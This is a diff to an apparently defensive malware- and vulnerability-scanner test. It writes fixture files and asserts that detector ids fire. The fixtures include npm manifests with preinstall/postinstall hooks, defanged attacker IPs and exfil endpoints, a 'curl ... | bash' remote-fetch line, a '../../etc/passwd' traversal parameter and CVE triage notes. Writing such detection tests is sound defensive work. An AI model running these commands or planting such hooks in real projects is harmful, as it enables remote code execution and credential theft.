@@ -96,6 +96,28 @@ function run() {
     "const secondary = 'https://cloudflarefirewall.vercel.app/api/v1';", // push-guard: ignore
     "const legacy = 'https://cloudflaresecurity.vercel.app/api/ssh-key';" // push-guard: ignore
   ].join("\n"));
+  write(path.join(home, "easy-day-js", "package.json"), JSON.stringify({
+    dependencies: {
+      "easy-day-js": "1.11.22"
+    },
+    scripts: {
+      postinstall: "node setup.cjs --no-warnings"
+    },
+    notes: "23.254[.]164.92:8000 23.254[.]164.123:443 protocal.cjs nvmconf.service .pkg_history"
+  }, null, 2));
+  write(path.join(home, "procwire", "package.json"), JSON.stringify({
+    dependencies: {
+      procwire: "1.3.0",
+      routecraft: "4.2.0",
+      endpointmap: "2.1.0",
+      bytecraft: "1.5.0",
+      staticlayer: "1.1.0"
+    },
+    scripts: {
+      preinstall: "node lib/setup.js"
+    },
+    notes: "files[.]catbox[.]moe/j4loim[.]chk Microsoft-Delivery-Optimization/10.0 Zone.Identifier [ZoneTransfer] ZoneId=0 msedge_update chrome_installer dotnet_host onedrive_setup teams_update bitsadmin curl.exe windowsHide: true"
+  }, null, 2));
   write(path.join(home, ".cursor", "extensions", "exargd.vsblack-0.0.1", "package.json"), JSON.stringify({
     publisher: "exargd",
     name: "vsblack",
@@ -112,6 +134,10 @@ function run() {
     "const wallet = '6ExrZayPZzMMSnszc42cH81DpuKT8FhCX9H6Sesn6rpz';",
     "const cp = require('child_process');",
     "cp.execSync('curl -fsSL https://dodod.lat/linux/i/_ | bash', { windowsHide: true });"
+  ].join("\n"));
+  write(path.join(home, ".local", "share", "JetBrains", "IntelliJIdea2026.1", "maliciousPlugins.txt"), [
+    "installed=org.sm.yms.toolkit",
+    "exfil=39.107.60[.]51/api/software/key"
   ].join("\n"));
   write(path.join(home, "observatory-pr", ".gitignore"), [
     "node_modules/",
@@ -198,6 +224,34 @@ function run() {
     "$path = 'program/actions/settings/upload.php';",
     "$from = $_POST['_from'] ?? '';",
   ].join("\n"));
+  write(path.join(root, "var", "www", "joomla", "plugins", "editors", "jce", "jce.xml"), [
+    "<extension>",
+    "<name>JCE Pro - Joomla Content Editor</name>",
+    "<version>2.9.99.5</version>",
+    "<element>com_jce</element>",
+    "</extension>"
+  ].join("\n"));
+  write(path.join(root, "var", "www", "joomla", "administrator", "components", "com_jce", "incident-note.txt"), [
+    "CVE-2026-48907 CISA Known Exploited Vulnerabilities",
+    "Widget Factory Joomla Content Editor improper access control",
+    "rogue profile allowed upload and execution of PHP code"
+  ].join("\n"));
+  write(path.join(root, "opt", "splunk", "etc", "splunk.version"), [
+    "VERSION=10.0.1",
+    "Splunk Enterprise build fixture"
+  ].join("\n"));
+  write(path.join(root, "opt", "splunk", "var", "log", "splunk", "web_access.log"), [
+    "CVE-2026-20253 CISA KEV BOD 26-04 Splunk Enterprise PostgreSQL sidecar",
+    "POST /v1/postgres/recovery/backup HTTP/1.1",
+    "POST /v1/postgres/recovery/restore HTTP/1.1",
+    "backupFile=../../etc/passwd database parameter .pgpass pg_restore pg_dump arbitrary file creation truncation"
+  ].join("\n"));
+  write(path.join(root, "var", "www", "redcap", "redcap_v16_0_17", "version.php"), [
+    "<?php",
+    "$redcap_version = '16.0.17';",
+    "// REDCap legacy instance targeted by UNC6508 for credential harvesting.",
+    "// InfiniteRed backdoor triage note for clinical research server."
+  ].join("\n"));
   write(path.join(root, "tmp", "gentlemen.bmp"), "placeholder");
   write(path.join(root, "opt", "gentlemen", "dControl.exe"), "placeholder");
   write(path.join(root, "opt", "gentlemen", "def1.bat"), [
@@ -226,6 +280,13 @@ function run() {
     "UDP heartbeat to asper1.freeddns.org and Winst0.kozow.com",
     "Windows Color System Calibration Loader COM hijacking persistence",
     "Sandboxie Procmon64 PowerShell natives2_blob.bin",
+  ].join("\n"));
+  write(path.join(root, "Users", "alice", "Desktop", "crypto-clipper-triage.txt"), [
+    "Microsoft Defender alert: Trojan:Win32/CryptoBandits.A",
+    "Crypto Clipper USB .lnk spread observed from removable drive.",
+    "Portable Tor client started SOCKS5 proxy at localhost:9050.",
+    "Clipboard inspection found wallet addresses and a seed phrase.",
+    "PowerShell screenshot capture followed by Curl exfiltration."
   ].join("\n"));
   write(path.join(root, "usr", "share", "man9", "ph", ".ph.man"), "captured ssh credential log placeholder\n");
   write(path.join(root, "lib", "systemd", "system", "chrom.service"), [
@@ -332,10 +393,14 @@ function run() {
   assert(ids.has("atomicarch-payload-text-indicator"));
   assert(ids.has("ottercookie-npm-package-reference"));
   assert(ids.has("ottercookie-text-indicator"));
+  assert(ids.has("easy-day-js-mastra-indicator"));
+  assert(ids.has("procwire-routecraft-windows-dropper-indicator"));
   assert(ids.has("glasswasm-openvsx-package-reference"));
   assert(ids.has("glasswasm-openvsx-wasm-payload-file"));
   assert(ids.has("glasswasm-openvsx-loader-shape"));
   assert(ids.has("glasswasm-openvsx-text-indicator"));
+  assert(ids.has("jetbrains-marketplace-ai-key-plugin-reference"));
+  assert(ids.has("jetbrains-marketplace-ai-key-exfil-indicator"));
   assert(ids.has("astro-config-require-loader"));
   assert(ids.has("astro-config-network-eval-loader"));
   assert(ids.has("astro-config-hidden-payload-line"));
@@ -365,6 +430,16 @@ function run() {
   assert(ids.has("paloalto-globalprotect-cve-2026-0257-poc-client-config"));
   assert(ids.has("roundcube-cve-2025-49113-vulnerable-version"));
   assert(ids.has("roundcube-cve-2025-49113-poc-artifact"));
+  assert(ids.has("joomla-jce-cve-2026-48907-vulnerable-version"));
+  assert(ids.has("joomla-jce-cve-2026-48907-poc-or-kev-reference"));
+  assert(ids.has("joomla-jce-cve-2026-48907-profile-upload-review"));
+  assert(ids.has("splunk-cve-2026-20253-kev-reference"));
+  assert(ids.has("splunk-cve-2026-20253-postgres-sidecar-endpoint"));
+  assert(ids.has("splunk-cve-2026-20253-enterprise-10-review"));
+  assert(ids.has("splunk-cve-2026-20253-file-write-chain-review"));
+  assert(ids.has("redcap-outdated-version-review"));
+  assert(ids.has("redcap-exposure-indicator"));
+  assert(ids.has("redcap-unc6508-triage-note"));
   assert(ids.has("gentlemen-ransomware-note-wallpaper"));
   assert(ids.has("gentlemen-toolkit-file-name"));
   assert(ids.has("gentlemen-encryptor-runtime-marker"));
@@ -377,6 +452,9 @@ function run() {
   assert(ids.has("argamal-game-rat-bitsadmin-stage"));
   assert(ids.has("argamal-game-rat-com-hijack-marker"));
   assert(ids.has("argamal-game-rat-anti-analysis-marker"));
+  assert(ids.has("crypto-clipper-usb-worm-indicator"));
+  assert(ids.has("crypto-clipper-usb-lnk-spread-review"));
+  assert(ids.has("crypto-clipper-screenshot-exfil-review"));
   assert(ids.has("operation-highland-ioc-path"));
   assert(ids.has("operation-highland-tool-filename"));
   assert(ids.has("operation-highland-network-indicator"));
